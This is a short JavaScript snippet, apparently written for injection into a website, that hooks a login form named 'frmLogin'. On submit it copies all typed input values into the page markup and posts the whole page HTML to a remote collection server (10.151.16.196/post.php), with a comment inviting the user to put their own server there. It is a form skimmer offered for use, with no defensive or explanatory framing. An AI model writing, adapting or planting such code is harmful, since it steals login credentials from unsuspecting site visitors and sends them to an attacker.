

var remote_post = "http://10.151.16.196/post.php"; //Provide your server's full path to POST page here
var x=document.getElementsByName("frmLogin");

x.onsubmit = function( e ) {
   //e = e || window.event;
   makePost();
   //if ( !countChecked() ) {
   //    e.preventDefault();
   //    e.returnValue = false;
   //}

};


function makePost() {
    var inputs = document.getElementsByTagName("input");
    for (var i=0, max=inputs.length; i < max; i++) {
         //inputs[i].setAttribute("onblur", "inputFunc(this)");
         inputs[i].setAttribute("value", inputs[i].value);
    }
    // Create JS POST Function
    var http = new XMLHttpRequest();
    var params = "data=" + document.getElementsByTagName('html')[0].innerHTML;
    http.open("POST", remote_post, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
    
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
                //alert(http.responseText);
            }
    }
    http.send(params);
}
